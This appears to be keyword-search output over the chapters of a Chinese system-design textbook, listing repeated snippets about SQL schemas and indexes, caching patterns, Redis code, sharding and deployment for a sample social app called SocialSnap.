  c05_b02.md: ....content, posts.created_at     FROM posts     JOIN users ON posts.user_id = users.id     WHERE users.username = 'alice'     O...
  c05_b02.md: ...= users.id     WHERE users.username = 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join...
  c05_b02.md: ...= 'alice'     ORDER BY posts.created_at DESC;  这条查询：  1. 从 `posts` 取所有行 2. 把每个 post join 到 `users` 中匹配的行（`user_id` 等于 `id`） 3...
  c05_b02.md: ...有些查询快、有些查询灾难性慢。   #### 朴素方法：全表扫描  假设你运行：      SELECT * FROM posts WHERE user_id = 1;  没有任何特殊结构时，数据库读取 `posts` 表的每一行，检查 `user_...
  c05_b02.md: ...SELECT * FROM posts WHERE user_id = 1;  没有任何特殊结构时，数据库读取 `posts` 表的每一行，检查 `user_id = 1`。对 100 万行的表，就是 100 万次比较。1 亿行就是 1 亿次比...
  c05_b03.md: ...harding（分片）”的出现，直接在索引里查 “sharding”（O(log n) 查找），得到页码。  当你在 `posts.user_id` 上建索引：      CREATE INDEX idx_posts_user_id ON posts...
  c05_b03.md: ...posts.user_id` 上建索引：      CREATE INDEX idx_posts_user_id ON posts(user_id);  数据库会创建一个 B-tree，每个叶节点包含一个 `user_id` 值和指向对应行的指针。查...
  c05_b03.md: ...引**：每个索引都会拖慢写入。一张表上有 20 个很少用的索引，写入会变慢而收益很小  对 SocialSnap 的 `posts` 表，好的索引候选：  * `user_id`（按用户找帖子） * `created_at`（按时间找近期帖子） *...
  c05_b06.md: ...ed_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id          SERIAL PRIMARY KEY,         user_id...
  c05_b06.md: ...) ON DELETE CASCADE,         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAUL...
  c05_b06.md: ...es for common queries     CREATE INDEX idx_posts_user_id ON posts(user_id);     CREATE INDEX idx_posts_created_at ON posts(cr...
  c05_b06.md: ...ON posts(user_id);     CREATE INDEX idx_posts_created_at ON posts(created_at DESC);         CREATE INDEX idx_follows_followed...
  c05_b06.md: ...查找。  **主页 Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子”：      SELECT posts.id, posts.content, posts.created_at, users.username     FRO...
  c05_b06.md: ...Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子”：      SELECT posts.id, posts.content, posts.created_at, users.username     FROM posts...
  c05_b06.md: ...lice 看她关注的人最近 20 条帖子”：      SELECT posts.id, posts.content, posts.created_at, users.username     FROM posts     JOIN follows...
  c05_b06.md: ...d, posts.content, posts.created_at, users.username     FROM posts     JOIN follows ON posts.user_id = follows.followed_id...
  c05_b06.md: ...eated_at, users.username     FROM posts     JOIN follows ON posts.user_id = follows.followed_id     JOIN users ON posts.user_...
  c05_b06.md: ...ws ON posts.user_id = follows.followed_id     JOIN users ON posts.user_id = users.id     WHERE follows.follower_id = 1  -- Al...
  c05_b06.md: ...RE follows.follower_id = 1  -- Alice 的 user_id     ORDER BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `follows.fo...
  c05_b06.md: ...SC     LIMIT 20;  这条查询 join 三张表。如果 `follows.follower_id` 和 `posts.created_at` 上有合适的索引，当 Alice 关注的人数合理（几百人）时，它很快。当 Alice 关注 10...
  c05_b10.md: ...展，包括合适的索引。然后写一条 SQL 查询“给我看所有提及 Alice 的帖子，按最近排序”。  提示  把提及存成 posts 表里的逗号分隔字符串（“@alice,@bob”）违反关系模型，也让查询很难。想想提及是什么实体，以及它如何与 pos...
  c05_b10.md: ...sts 表里的逗号分隔字符串（“@alice,@bob”）违反关系模型，也让查询很难。想想提及是什么实体，以及它如何与 posts 和 users 关联。  **答案：**  **Schema 扩展：**      CREATE TABLE ment...
  c05_b10.md: ...ATE TABLE mentions (         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         user_id     INTEGER REFERENC...
  c05_b10.md: ...杂（必须扫描所有帖子内容找用户名）  **查询——所有提及 Alice 的帖子，最新在前：**      SELECT posts.id, posts.content, posts.created_at, author.username AS aut...
  c05_b10.md: ...内容找用户名）  **查询——所有提及 Alice 的帖子，最新在前：**      SELECT posts.id, posts.content, posts.created_at, author.username AS author     FR...
  c05_b10.md: ...所有提及 Alice 的帖子，最新在前：**      SELECT posts.id, posts.content, posts.created_at, author.username AS author     FROM mentions...
  c05_b10.md: ...ed_at, author.username AS author     FROM mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON...
  c05_b10.md: ...thor     FROM mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_id = author.id...
  c05_b10.md: ...ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_id = author.id     WHERE mentions.user_id = (SELECT id...
  c05_b10.md: ...SELECT id FROM users WHERE username = 'alice')     ORDER BY posts.created_at DESC     LIMIT 20;  有了 `idx_mentions_user_id`，数据...
  c05_b10.md: ...取 `mentions` 中 Alice 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）Soci...
  c05_b11.md: ...00 万）赞的病毒帖，即使索引扫描也要花不少时间。  **方案 2：反规范化计数器（更适合点赞数这种场景）**  在 `posts` 表里加一个 `like_count` 列（我们在 5.4 节的 schema 中已经勾勒过）。每次点赞时在事务内原子...
  c05_b11.md: ...TO likes (user_id, post_id) VALUES (456, 12345);     UPDATE posts SET like_count = like_count + 1 WHERE id = 12345;     COMMI...
  c05_b11.md: ...COMMIT;  现在“帖子 12345 有多少赞？”变成：      SELECT like_count FROM posts WHERE id = 12345;  这是 O(1) 主键查找——微秒级而非毫秒级。tradeoff（权衡）：你现在把...
  c05_b11.md: ...是 O(1) 主键查找——微秒级而非毫秒级。tradeoff（权衡）：你现在把计数存在两个地方（`likes` 表和 `posts.like_count`）。如果你批量删除点赞（如清理垃圾），也必须更新计数器。如果计数器与真实 `likes` 表不同...
  c05_b11.md: ...d_at   TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (         id          SERIAL PRIMARY KEY,         user_id...
  c05_b12.md: ...`users.id` 是代理主键（`SERIAL` 生成自增整数）。它稳定——即使用户改名或改简介，ID 不变，所以 `posts` 中的外键引用仍然有效。 * `posts.user_id` 是引用 `users.id` 的外键。`ON DELET...
  c05_b12.md: ...AL` 生成自增整数）。它稳定——即使用户改名或改简介，ID 不变，所以 `posts` 中的外键引用仍然有效。 * `posts.user_id` 是引用 `users.id` 的外键。`ON DELETE CASCADE` 子句意味着如果用户账户...
  c05_b12.md: ...**      SELECT id, content, image_urls, created_at     FROM posts     WHERE user_id = 42     ORDER BY created_at DESC     LIM...
  c05_b12.md: ...LIMIT 20;  **为什么需要索引：** 如果没有 `user_id` 索引，数据库会执行全表扫描——读取 `posts` 的每一行来找到属于用户 42 的。10 million（1000 万）帖子、10,000（1 万）用户，平均每个用户...
  c05_b12.md: ...at DESC)` 复合索引：      CREATE INDEX idx_posts_user_created ON posts(user_id, created_at DESC);  这个索引用一个结构服务查询的两部分。数据库找到 B-tree...
  c05_b12.md: ...O(n)（扫描整张表）降到 O(log n + 20)，与总表大小无关。  这与 5.2 节为 SocialSnap posts 表引入的复合索引 `(user_id, created_at)` 原理相同。复合索引中选择正确的列顺序（过滤列在前，排...
  c05_b14.md: ...ialSnap v1**：一个由 PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、follows 和 likes。这是一个完整、正确的基础，能在触及限制前处理数万到数十万用户。  这些限制——单机写入...
  c09_b08.md: ...→ partial update of user 42     DELETE /users/42/posts/101       → delete post 101 by user 42   响应通常是 JSON。REST 是无...
  c09_b08.md: ...GET /users/42           → Alice's profile     GET /users/42/posts     → Alice's recent posts     GET /users/42/followers → Al...
  c09_b08.md: ...lice's profile     GET /users/42/posts     → Alice's recent posts     GET /users/42/followers → Alice's follower count   三个独立...
  c09_b08.md: ...user(id: 42) {         username         photoUrl         posts(limit: 5) {           title           createdAt         }...
  c10_b04.md: ...Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg...
  c10_b04.md: ...Object key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg...
  c10_b04.md: ...Object key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，但只是字符串——没有真实目录结构。列出“用户 42...
  c12_b11.md: ...2;  // 在用户所在 shard     2. 对每个 shard (0..7):          UPDATE posts SET author_username = 'new_name' WHERE user_id = 42;     3....
  c12_b11.md: ...完成第 1 步后、但在完成第 2 步所有 shard 前崩溃。`users` 表显示新用户名，但某些 shard 的 `posts` 表仍显示旧用户名。用户现在看到旧帖子上是旧用户名，新帖子上是新用户名——不一致。这是部分更新失败。  **失败 2：...
  c13_b12.md: ...**第 1 步：定义契约。** 在写任何服务代码前，先定义 Notification Service 将暴露的 API。Posts Service 如何通知它帖子已创建？通过消息队列（推荐）还是直接 HTTP 调用？决策：使用第 8 章的消息队列——...
  c13_b12.md: ...Notification Service 自己的数据库实例。更新 Notification Service 的连接配置。Posts Service 不再引用 `notifications` 表。  迁移全程没有停机。迁移是增量的，每一步都有安全的回滚...
  c17_b06.md: ...h_posts (148ms)             [55ms - 80ms]  Database: SELECT posts WHERE id IN (...) (25ms)             [85ms - 195ms] User Se...
  c18_b12.md: ...tions”（用户可以用 emoji 对帖子反应，而不仅是点赞）。这需要数据库迁移（添加 `reactions` 表和 posts 上的新 `reaction_count` 列）、新 API 端点，以及 feed 渲染服务的变更。设计部署计划，包括迁...
  c18_b12.md: ...ctions` 表（id, post_id, user_id, reaction_type, created_at）和 posts 上的 `reaction_count` 列（默认 0，NOT NULL）。 * 该迁移向后兼容：现有代码不知道这些表，...
  c18_b12.md: ...更改应用代码。  **阶段 2——后端部署，功能开关关闭（第 1 周）：**  * 部署新 API 端点 `POST /posts/{id}/reactions`——代码存在，但在功能开关打开前返回 404。 * 部署 Feed Service 变更...
  c19_b02.md: ...。  plain 语言：给每个人最小必要访问，别多给。  Feed Service 用于读取帖子的数据库账户应只拥有 `posts` 表的 `SELECT` 权限，不能有 `INSERT`、`UPDATE`、`DELETE`、`DROP TABLE`...
  c19_b02.md: ...ETE`、`DROP TABLE`。如果 Feed Service 被入侵，攻击者继承的只是被入侵账户的权限：只读访问 posts。他们无法删除数据、修改账户或访问支付记录。  最小权限不是不信任自己的服务。它是限制出错时的影响范围——无论原因是 b...
  c22_b12.md: ...复杂化 timeline 设计？  **答案：** 扇出架构需要感知帖子可见性。关键变化：  **数据库变更：** 给 posts 增加 `visibility` 字段：`ENUM('public', 'close_friends', 'privat...

=== cache (63 occurrences) ===
  c07_b03.md: ...以及大多数超过单服务器的应用——分布式缓存是正确选择。这是 SocialSnap v2 要走的路。   ### 7.3 Cache-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **...
  c07_b03.md: ...-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责...
  c07_b03.md: ...eoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责管理缓存。缓存本身“在旁边”——它不会自动接收写入或使条目失效。应用显式检查缓存、处理...
  c07_b03.md: ...以及大多数超过单服务器的应用——分布式缓存是正确选择。这是 SocialSnap v2 要走的路。   ### 7.3 Cache-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **...
  c07_b03.md: ...-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责...
  c07_b03.md: ...eoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责管理缓存。缓存本身“在旁边”——它不会自动接收写入或使条目失效。应用显式检查缓存、处理...
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache...
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Return the cached value     3...
  c07_b04.md: ...算法  读取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Return the cached value     3. If cache MISS:...
  c07_b04.md: ...2. If cache HIT:        - Return the cached value     3. If cache MISS:        - Query the database for the value        - St...
  c07_b04.md: ...the database for the value        - Store the value in the cache with a TTL        - Return the value to the caller   写入新值：...
  c07_b04.md: ...idate (delete) the old cached value — OR — update it in the cache   让我们用 SocialSnap 走一遍。用户请求 Alice 的资料时：  **第一次请求（冷缓存）：**  1....
  c07_b04.md: ...deoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更主动的方式。...
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache...
  c07_b04.md: ...#### Cache-Aside 算法  读取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Return the cached value     3...
  c07_b04.md: ...算法  读取一个值：       1. Look up the key in the cache     2. If cache HIT:        - Return the cached value     3. If cache MISS:...
  c07_b04.md: ...2. If cache HIT:        - Return the cached value     3. If cache MISS:        - Query the database for the value        - St...
  c07_b04.md: ...the database for the value        - Store the value in the cache with a TTL        - Return the value to the caller   写入新值：...
  c07_b04.md: ...idate (delete) the old cached value — OR — update it in the cache   让我们用 SocialSnap 走一遍。用户请求 Alice 的资料时：  **第一次请求（冷缓存）：**  1....
  c07_b04.md: ...deoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更主动的方式。...
  c07_b05.md: ...径：**       1. Write value to database     2. Write value to cache     3. Return success   **读取路径：**       1. Check cache — al...
  c07_b05.md: ...e to cache     3. Return success   **读取路径：**       1. Check cache — almost always a HIT (cache is always up to date)     2. O...
  c07_b05.md: ...cache is always up to date)     2. On miss (first access or cache restart): fetch from database   **收益：** 缓存从不过期。读取几乎总是命中缓存。...
  c07_b05.md: ...中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Write value to cache (fast, in-memory)     2. Mark the entry as "dirty" (pending...
  c07_b05.md: ...存用持久性换取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解  许多工程师假设 cache-aside 总是正确的默认。它是最常见模式，但有一个隐藏成本：**惊群问题（thundering herd）**。当缓...
  c07_b07.md: ...r Request         ↓     Application Server         ↓ (check cache first)     Redis Cache         ↓ (on miss only)     Postgre...
  c07_b07.md: ...Application Server         ↓ (check cache first)     Redis Cache         ↓ (on miss only)     PostgreSQL Database   **资料缓存：*...
  c07_b07.md: ...cache_key = f"user:{user_id}:profile"          # Check cache         cached = redis.get(cache_key)         if cached:...
  c07_b07.md: ...if cached:             return json.loads(cached)  # Cache hit          # Cache miss — query database         profile...
  c07_b07.md: ...return json.loads(cached)  # Cache hit          # Cache miss — query database         profile = db.query("SELECT *...
  c07_b07.md: ...* FROM users WHERE id = %s", [user_id])          # Store in cache with 5-minute TTL         redis.setex(cache_key, 300, json....
  c07_b07.md: ...s WHERE id = %s", [new_bio, user_id])          # Invalidate cache         redis.delete(f"user:{user_id}:profile")   **影响：** 如...
  c07_b07.md: ...r Request         ↓     Application Server         ↓ (check cache first)     Redis Cache         ↓ (on miss only)     Postgre...
  c07_b07.md: ...Application Server         ↓ (check cache first)     Redis Cache         ↓ (on miss only)     PostgreSQL Database   **资料缓存：*...
  c07_b07.md: ...cache_key = f"user:{user_id}:profile"          # Check cache         cached = redis.get(cache_key)         if cached:...
  c07_b07.md: ...if cached:             return json.loads(cached)  # Cache hit          # Cache miss — query database         profile...
  c07_b07.md: ...return json.loads(cached)  # Cache hit          # Cache miss — query database         profile = db.query("SELECT *...
  c07_b07.md: ...* FROM users WHERE id = %s", [user_id])          # Store in cache with 5-minute TTL         redis.setex(cache_key, 300, json....
  c07_b07.md: ...s WHERE id = %s", [new_bio, user_id])          # Invalidate cache         redis.delete(f"user:{user_id}:profile")   **影响：** 如...
  c07_b11.md: .../秒——在数据库能力范围内。命中率每提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：...
  c07_b11.md: ...、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加载）：** 应用显式检查缓存，未命中时从数据库取回并存储结果。缓存只在数据实际被请求时填充。最适合：并...
  c07_b11.md: .../秒——在数据库能力范围内。命中率每提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：...
  c07_b11.md: ...、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加载）：** 应用显式检查缓存，未命中时从数据库取回并存储结果。缓存只在数据实际被请求时填充。最适合：并...
  c07_b13.md: ...——用户一年可能只更新几次头像。旧数据后果：刚更新头像的用户几分钟内看到旧照片——有点烦人，但可接受。  缓存策略：**Cache-aside**，长 TTL（30–60 分钟）。照片更新时使缓存 key 失效。长 TTL 可接受，因为更新少且陈旧影...
  c07_b13.md: ...te-through 或直接 Redis 计数器**。因为这个数字变化频繁且准确性重要，短 TTL（10–30 秒）加 cache-aside 可行，但会导致频繁未命中。更好的方法：直接把计数存为 Redis 整数，用 `INCR`/`DECR` 操...
  c07_b13.md: ...0 变到 1,000,001——0.0001% 的变化，没有用户会注意。  缓存策略：**Write-behind 或 cache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数字。用 cach...
  c07_b13.md: ...ache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数字。用 cache-aside，10 分钟 TTL。未命中时运行 `SELECT COUNT(*) FROM posts`（大表上可能慢—...
  c07_b13.md: ...——用户一年可能只更新几次头像。旧数据后果：刚更新头像的用户几分钟内看到旧照片——有点烦人，但可接受。  缓存策略：**Cache-aside**，长 TTL（30–60 分钟）。照片更新时使缓存 key 失效。长 TTL 可接受，因为更新少且陈旧影...
  c07_b13.md: ...te-through 或直接 Redis 计数器**。因为这个数字变化频繁且准确性重要，短 TTL（10–30 秒）加 cache-aside 可行，但会导致频繁未命中。更好的方法：直接把计数存为 Redis 整数，用 `INCR`/`DECR` 操...
  c07_b13.md: ...0 变到 1,000,001——0.0001% 的变化，没有用户会注意。  缓存策略：**Write-behind 或 cache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数字。用 cach...
  c07_b13.md: ...ache-aside 加长 TTL（10–60 分钟）**。这个计数本质上是近似的——没人需要实时看到精确当前数字。用 cache-aside，10 分钟 TTL。未命中时运行 `SELECT COUNT(*) FROM posts`（大表上可能慢—...
  c07_b17.md: ...tradeoff（权衡）。对大多数多服务器应用，Redis 或 Memcached 这类分布式缓存是正确默认。  **Cache-aside** 是最常见模式：先查缓存，未命中时取数据库，填充缓存，返回。它是懒加载的（只缓存被请求的内容），并把失效...
  c11_b14.md: ...的朋友可能看到旧资料。  **修复：** 把 `local_cache` 换成共享 Redis 缓存，使用第 7 章的 cache-aside 模式：       def get_user_profile(user_id):         cach...
  c20_b05.md: ...**  热数据集（最热的 1% URL = 约 100 万条记录 = 250MB）可放入内存。我们用 Redis 配合 cache-aside 模式（第 7 章）：  1. 请求到达短码 `abc1234` 2. 检查 Redis：缓存命中 → 立即...
  c20_b08.md: ...进：  设计决策 | 延迟 | 一致性 | 可用性 | 运营复杂度 ---|---|---|---|--- Redis cache-aside（缓存主读策略） | 很低（命中 5ms） | 最终一致（基于 TTL 或显式失效） | 高（未命中回退到...
  c27_b02.md: ...TTL 缓存。第一次陈旧 bug：用户更新了用户名，但缓存版本最多 60 秒仍显示旧名。  **关键决策：**  * Cache-aside 模式：应用先查缓存，未命中回数据库，回写缓存 * Profile 数据 TTL 60 秒 * Redis...
  c27_b06.md: ...SQL 存储用户和帖子数据——以写吞吐限制为代价获得强一致性和持久性。”  **v2（添加缓存）时：** “Redis cache-aside 用于 profile——以陈旧和缓存失效复杂度为代价获得低延迟读。”  **v5（分片）时：** “Use...
  c28_b11.md: ...sandra)** (Ch 6) | 低（写优化） | 可调（N/W/R quorum） | 极高（无主） | 高 **Cache-aside** (Ch 7) | 命中降低读；未命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 |...
  c28_b11.md: ...命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 | 中——手动失效 **Write-through cache** (Ch 7) | 写延迟更高（同时写缓存和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB 任一失败则...
  c28_b11.md: ...和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB 任一失败则写失败 | 中 **Write-behind cache** (Ch 7) | 写延迟更低（异步写 DB） | 最终——DB 可能落后缓存 | 缓存失败且未写 DB 有丢数据风...
  c28_b11.md: ...sandra)** (Ch 6) | 低（写优化） | 可调（N/W/R quorum） | 极高（无主） | 高 **Cache-aside** (Ch 7) | 命中降低读；未命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 |...
  c28_b11.md: ...命中走 DB | 最终（TTL 陈旧） | 高——缓存故障读仍存活 | 中——手动失效 **Write-through cache** (Ch 7) | 写延迟更高（同时写缓存和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB 任一失败则...
  c28_b11.md: ...和 DB） | 强——写后缓存始终最新 | 中——缓存或 DB 任一失败则写失败 | 中 **Write-behind cache** (Ch 7) | 写延迟更低（异步写 DB） | 最终——DB 可能落后缓存 | 缓存失败且未写 DB 有丢数据风...

=== write (59 occurrences) ===
  c05_b09.md: ...3. **读/写比例如何？** 对 mostly-read 的表（如国家代码查询表），可以大胆加索引。对 mostly-write 的表（如事件日志），应谨慎加索引。 4. **列是否选择性高？** 对布尔列（true/false）建索引几乎没用——...
  c07_b04.md: ...TL        - Return the value to the caller   写入新值：       1. Write the new value to the database     2. Invalidate (delete) th...
  c07_b04.md: ...可能看到旧数据**。因此设置 TTL 是一个直接调节新鲜度与性能 tradeoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另...
  c07_b04.md: ...TL 是一个直接调节新鲜度与性能 tradeoff（权衡）的旋钮。   ### 7.4 Write-Through 和 Write-Behind——其他模式  Cache-aside 是懒加载：只在未命中时填充缓存。另外两种模式采取更主动的方式。...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**...
  c07_b05.md: ...aching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return...
  c07_b05.md: ...数据库保持同步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return success   **读取路径：**       1. C...
  c07_b05.md: ...作（数据库 + 缓存）。写入延迟增加。如果你写入的数据永远不会被读取，就浪费了缓存空间和写入开销（“写放大”问题）。  Write-through 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Wr...
  c07_b05.md: ...te-through 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存...
  c07_b05.md: ...资料——读数千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**...
  c07_b05.md: ...hind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Write value to cache (fast, in-memory)     2. Mark the entry as "...
  c07_b05.md: ...** **持久性风险。** 如果缓存服务器在脏条目刷盘前失败，数据就丢失了。你已经向用户返回成功，但数据从未持久化。  Write-behind 用于特定的高写入场景，其中一些数据丢失可接受（分析事件、计数器、非关键指标）。它几乎从不用于需要持久性的...
  c07_b05.md: ...务数据。  回想第 5 章，ACID 的 D——**持久性（Durability）**——意味着已提交事务在失败中幸存。Write-behind 缓存用持久性换取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解...
  c07_b05.md: ...请求，它过期时，5,000 个请求会在同一秒落到数据库。数据库此前几乎不处理这个 key 的负载，突然收到流量尖峰。  Write-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），wr...
  c07_b05.md: ...te-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-through 通常更可取，正因为它消除了惊群。   ### 7.5 驱逐——缓存满了怎么办  缓存驻留在内存中。内存...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存...
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**...
  c07_b05.md: ...aching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return...
  c07_b05.md: ...数据库保持同步。  **写入路径：**       1. Write value to database     2. Write value to cache     3. Return success   **读取路径：**       1. C...
  c07_b05.md: ...作（数据库 + 缓存）。写入延迟增加。如果你写入的数据永远不会被读取，就浪费了缓存空间和写入开销（“写放大”问题）。  Write-through 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Wr...
  c07_b05.md: ...te-through 在读写比高且能承受写入开销时表现良好。用户资料——读数千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存...
  c07_b05.md: ...资料——读数千次、很少更新——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**...
  c07_b05.md: ...hind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Write value to cache (fast, in-memory)     2. Mark the entry as "...
  c07_b05.md: ...** **持久性风险。** 如果缓存服务器在脏条目刷盘前失败，数据就丢失了。你已经向用户返回成功，但数据从未持久化。  Write-behind 用于特定的高写入场景，其中一些数据丢失可接受（分析事件、计数器、非关键指标）。它几乎从不用于需要持久性的...
  c07_b05.md: ...务数据。  回想第 5 章，ACID 的 D——**持久性（Durability）**——意味着已提交事务在失败中幸存。Write-behind 缓存用持久性换取写入性能。这正是权衡矩阵追踪的 tradeoff（权衡）类型。   #### 常见误解...
  c07_b05.md: ...请求，它过期时，5,000 个请求会在同一秒落到数据库。数据库此前几乎不处理这个 key 的负载，突然收到流量尖峰。  Write-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），wr...
  c07_b05.md: ...te-through 避免这个问题：写入时缓存立即重新填充，所以条目从不真正缺失。对热 key（被巨量请求访问的数据），write-through 通常更可取，正因为它消除了惊群。   ### 7.5 驱逐——缓存满了怎么办  缓存驻留在内存中。内存...
  c07_b07.md: ...e      def update_user_profile(user_id, new_bio):         # Write to database first         db.execute("UPDATE users SET bio...
  c07_b11.md: ...内。命中率每提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-...
  c07_b11.md: ...价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加载）：** 应用...
  c07_b11.md: ...适合：并非所有数据都会被访问的系统（提前缓存所有东西会浪费）。例子：用户资料查找——你只缓存用户实际请求的资料。  **Write-through：** 每次数据库写入也立即写入缓存。缓存始终与数据库同步。最适合：写入后随即被频繁读取的数据。例子：产...
  c07_b11.md: ...库同步。最适合：写入后随即被频繁读取的数据。例子：产品库存数——仓库操作更新，随后店铺在接下来几分钟读数百万次。  **Write-behind（write-back）：** 写入立即进入缓存，并异步刷到数据库。最适合：高容量写入工作负载，其中少量数...
  c07_b11.md: ...内。命中率每提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-...
  c07_b11.md: ...价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合的场景。  **答案：**  **Cache-aside（懒加载）：** 应用...
  c07_b11.md: ...适合：并非所有数据都会被访问的系统（提前缓存所有东西会浪费）。例子：用户资料查找——你只缓存用户实际请求的资料。  **Write-through：** 每次数据库写入也立即写入缓存。缓存始终与数据库同步。最适合：写入后随即被频繁读取的数据。例子：产...
  c07_b11.md: ...库同步。最适合：写入后随即被频繁读取的数据。例子：产品库存数——仓库操作更新，随后店铺在接下来几分钟读数百万次。  **Write-behind（write-back）：** 写入立即进入缓存，并异步刷到数据库。最适合：高容量写入工作负载，其中少量数...
  c07_b13.md: ...存什么。以下是他们在考虑的三种数据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（cache-aside、write-through 或 write-behind）：  (a) 用户头像照片（照片 URL 存在 users 表中） (b...
